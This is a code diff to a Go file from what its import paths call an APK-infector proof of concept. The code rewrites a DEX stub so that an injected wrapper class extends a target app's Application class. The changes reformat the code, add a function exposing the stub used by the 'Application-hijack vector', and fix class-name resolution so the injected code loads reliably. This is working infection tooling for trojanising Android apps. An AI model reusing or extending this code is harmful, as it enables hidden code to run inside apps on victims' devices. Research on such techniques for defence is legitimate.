@@ -12,29 +12,28 @@ import (
 	"strings"
 
 	"github.com/kaitai-io/kaitai_struct_go_runtime/kaitai"
-	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/manifest"
 	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
+	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/manifest"
 )
-
 
 const (
 	// DEX structure offsets
-	fileSizeOff              = 0x20
-	mapOff                   = 0x34
-	dataSizeOff              = 0x68
-	signatureOff             = 0x20
-	checksumOff              = 0xc
-	stringIdsCount           = 0x3 //how many stringIds we should change
-	classDataOffOff			 = 0xe4 //map->class_def_item->class_data_off
-	classDataItemOffOff		 = 0x29c //map->class_data_item->offset
-	annotationOffItemOff	 = 0x2a8 //map->annotation_set_item->entries->annotation_off_item
-	mapListOffOff			 = 0x2b4 //map->map_list->offset
+	fileSizeOff            = 0x20
+	mapOff                 = 0x34
+	dataSizeOff            = 0x68
+	signatureOff           = 0x20
+	checksumOff            = 0xc
+	stringIdsCount         = 0x3   //how many stringIds we should change
+	classDataOffOff        = 0xe4  //map->class_def_item->class_data_off
+	classDataItemOffOff    = 0x29c //map->class_data_item->offset
+	annotationOffItemOff   = 0x2a8 //map->annotation_set_item->entries->annotation_off_item
+	mapListOffOff          = 0x2b4 //map->map_list->offset
 	posStringIdsChangedOff = 0x84
 )
 
 // this name is patched so we should make it
 // as short as possible
-//var placeholder = "La/a/a;"
+// var placeholder = "La/a/a;"
 var placeholder = "Lz/z/z;"
 var placeholderLength = len(placeholder) + 1
 var placeholderOff int
@@ -82,36 +81,36 @@ func patchChecksum(data []byte) {
 	map->annotation_set_item->entries->annotation_off_item
 	map->map_list->offset
 
- */
+*/
 // Do not forget about alignment of some structures!
 
 func Patch_app_modifier(path string) {
 	// Открытие DEX-файла
-    f, err := os.Open(path)
-    if err != nil {
-        panic(err)
-    }
-    defer f.Close()
+	f, err := os.Open(path)
+	if err != nil {
+		panic(err)
+	}
+	defer f.Close()
 
 	dexFile := NewDex()
 	err = dexFile.Read(kaitai.NewStream(f), nil, dexFile)
 	if err != nil {
-        panic(err)
-    }
+		panic(err)
+	}
 
-    // Ищем определение класса, которое соответствует типу
-    classDefs, err := dexFile.ClassDefs()
-    if err != nil {
-        panic(err)
-    }
-    for i, classDefItem := range classDefs {
+	// Ищем определение класса, которое соответствует типу
+	classDefs, err := dexFile.ClassDefs()
+	if err != nil {
+		panic(err)
+	}
+	for i, classDefItem := range classDefs {
 		typeName, _ := classDefItem.TypeName()
 		//accessFlags := classDefItem.AccessFlags
 		if typeName == utils.OldAppNameNormalized {
 			//fmt.Printf("typename : %s | accessFlags = %d\n", typeName, accessFlags)
 
 			newAccessFlags := uint32(Dex_ClassAccessFlags__Public)
-		
+
 			// Запись изменений обратно в DEX данные
 			classDefOffset := dexFile.Header.ClassDefsOff + uint32(i*32) // 32 - размер ClassDefItem
 			//fmt.Printf("classDefOffset = %x\n", classDefOffset)
@@ -121,7 +120,7 @@ func Patch_app_modifier(path string) {
 			}
 
 			binary.LittleEndian.PutUint32(data[classDefOffset+4:], newAccessFlags)
-			
+
 			patchSignature(data[0:])
 			patchChecksum(data[0:])
 
@@ -134,8 +133,12 @@ func Patch_app_modifier(path string) {
 				panic(err)
 			}
 		}
-    }
+	}
 }
+
+// StubPath returns the dex file the Application-hijack vector rewrites in
+// place (the stub that ships as classes2.dex).
+func StubPath() string { return dexPath }
 
 func Patch() {
 
@@ -149,16 +152,21 @@ func Patch() {
 
 	log.Printf("placeholderOff = 0x%x\n", placeholderOff)
 
-	// we should add "L" and ";", and convert "."->"/" to be a normal DEX string
-	//tmpName := "z.z.zzzzzzzzzzzzzzzz"
-	
-	utils.OldAppNameNormalized = "L" + strings.ReplaceAll(manifest.OldAppNameUTF8, ".", "/") + ";"
-	//oldAppNameNormalized := "L" + strings.ReplaceAll(tmpName, ".", "/") + ";"
+	// we should add "L" and ";" and convert "."->"/" to get a dex descriptor.
+	// The name must be fully qualified here (resolveClassName): the wrapper
+	// extends the host Application class, and a relative android:name such as
+	// ".MyApp" would otherwise be renamed to the non-existent "L/MyApp;", which
+	// makes ART fail to load the wrapper.
+	hostFQN := manifest.HostAppClassName()
+	if hostFQN == "" {
+		hostFQN = manifest.OldAppNameUTF8
+	}
+	utils.OldAppNameNormalized = "L" + strings.ReplaceAll(hostFQN, ".", "/") + ";"
 	newAppName := utils.OldAppNameNormalized + "\x00"
 
 	// patch string len (string_data_item->utf16_size)
 	// -1 - it's a position of len before every string in dex
-	data[placeholderOff - 1] = uint8(len(utils.OldAppNameNormalized))
+	data[placeholderOff-1] = uint8(len(utils.OldAppNameNormalized))
 
 	// how many bytes we added to DEX?
 	var sizeDiff uint32
@@ -207,7 +215,7 @@ func Patch() {
 		}
 
 		newId := oldId + sizeDiff
-		binary.LittleEndian.PutUint32(data[posStringIdsChangedOff + j:], newId)
+		binary.LittleEndian.PutUint32(data[posStringIdsChangedOff+j:], newId)
 		j += 4
 	}
 
@@ -250,7 +258,7 @@ func Patch() {
 	}
 
 	// insert new parent application name
-	data = append(data[:placeholderOff], append([]byte(newAppName), data[placeholderOff + placeholderLength:]...)...)
+	data = append(data[:placeholderOff], append([]byte(newAppName), data[placeholderOff+placeholderLength:]...)...)
 
 	// patch new fileSize (header_item->file_size)
 	var fileSize = uint32(len(data))
